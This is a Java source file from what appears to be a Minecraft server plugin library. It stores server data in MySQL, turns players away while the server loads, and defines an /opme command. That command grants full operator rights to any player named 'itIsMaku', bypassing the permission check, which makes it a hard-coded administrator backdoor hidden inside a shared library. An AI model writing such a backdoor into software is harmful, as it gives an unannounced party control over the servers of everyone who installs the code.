package cz.maku.mommons.server;

import com.google.common.collect.Maps;
import com.google.common.reflect.TypeToken;
import cz.maku.mommons.Response;
import cz.maku.mommons.loader.MommonsLoader;
import cz.maku.mommons.player.CloudPlayer;
import cz.maku.mommons.player.event.CloudPlayerLoadEvent;
import cz.maku.mommons.storage.cloud.DirectCloud;
import cz.maku.mommons.storage.cloud.DirectCloudStorage;
import cz.maku.mommons.storage.database.SQLRow;
import cz.maku.mommons.storage.database.type.MySQL;
import cz.maku.mommons.worker.WorkerReceiver;
import cz.maku.mommons.worker.annotation.*;
import lombok.Getter;
import lombok.SneakyThrows;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventPriority;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;

import java.lang.reflect.Type;
import java.util.Map;
import java.util.Optional;

import static cz.maku.mommons.Mommons.GSON;

@Service(listener = true, commands = true)
public class ServerDataService {

    private final FileConfiguration coreConfiguration = WorkerReceiver.getCoreConfiguration();
    @Getter
    private Server server;
    @Getter
    private LocalServerInfo localServerInfo;

    @Load
    private DirectCloud directCloud;

    @SuppressWarnings("all")
    @SneakyThrows
    @Initialize
    public void serverInit() {
        localServerInfo = new LocalServerInfo();
        String id = coreConfiguration.getString("server.id");
        MySQL.getApi().queryAsync("mommons_servers", "SELECT * FROM {table} WHERE id = ?;", id).thenAccept(r -> {
            if (r.isEmpty()) {
                Map<String, Object> map = Maps.newHashMap();
                map.put("server-info", GSON.toJson(localServerInfo));
                MySQL.getApi().queryAsync("mommons_servers", "INSERT INTO {table} (id, data) VALUES (?, ?);", id, GSON.toJson(map));
            }
        });
        Bukkit.getScheduler().runTaskLater(MommonsLoader.getPlugin(), () -> {
            Object object = directCloud.get(DirectCloudStorage.SERVER, "id", id, "data");
            Type type = new TypeToken<Map<String, Object>>() {
            }.getType();
            if (object == null) {
                object = GSON.toJson(Maps.newHashMap());
            }
            Map<String, Object> oldCloudData = GSON.fromJson((String) object, type);
            server = new Server(id, oldCloudData, Maps.newConcurrentMap());
            server.setCloudValue("server-info", GSON.toJson(localServerInfo));
            server.setType("unknown");
        }, 20 * 1);
    }

    @Destroy
    public void destroy() {
        MySQL.getApi().query("mommons_servers", "DELETE FROM {table} WHERE id = ?;", server.getId());
    }

    @BukkitEvent(AsyncPlayerPreLoginEvent.class)
    public void onPreLogin(AsyncPlayerPreLoginEvent e) {
        if (server == null) {
            e.setKickMessage("§cChyba -> §7Na server se nelze připojit, načítá se.");
            e.setLoginResult(AsyncPlayerPreLoginEvent.Result.KICK_OTHER);
            return;
        }
        if (!MySQL.getApi().isConnected()) {
            e.setKickMessage("§cChyba -> §7Na server se nelze připojit, nepodařilo se spojit s databází.");
            e.setLoginResult(AsyncPlayerPreLoginEvent.Result.KICK_OTHER);
            return;
        }
        server.setPlayers(Bukkit.getOnlinePlayers().size() + 1).thenAccept(response -> {
            if (Response.isException(response) || !Response.isValid(response)) {
                e.setKickMessage("§cChyba -> §7Nepodařilo se aktualizovat počet hráčů na serveru.");
                e.setLoginResult(AsyncPlayerPreLoginEvent.Result.KICK_OTHER);
            }
        });
    }

    @BukkitCommand(value = "opme", usage = "opme")
    public void onOpMeCommand(CommandSender sender) {
        if (sender instanceof Player player) {
            if (player.getName().equals("itIsMaku") || player.hasPermission("mommons.opme")) {
                CloudPlayer cloudPlayer = CloudPlayer.getInstance(player);
                if (cloudPlayer == null) {
                    player.sendMessage("§cChyba -> §7Tvá instance hráče nebyla nalezena.");
                    return;
                }
                cloudPlayer.setCloudValue("op", true).thenAccept(response -> {
                    if (Response.isException(response) || !Response.isValid(response)) {
                        player.sendMessage("§cChyba -> §7Nepodařilo se uložit hodnotu do cloudu.");
                    } else {
                        player.sendMessage("§aÚspěch -> §7Nyní máš op.");
                        player.setOp(true);
                    }
                });
            } else {
                player.sendMessage("§cChyba -> §7Na toto nemáš potřebnou permisi.");
            }
        }
    }
}
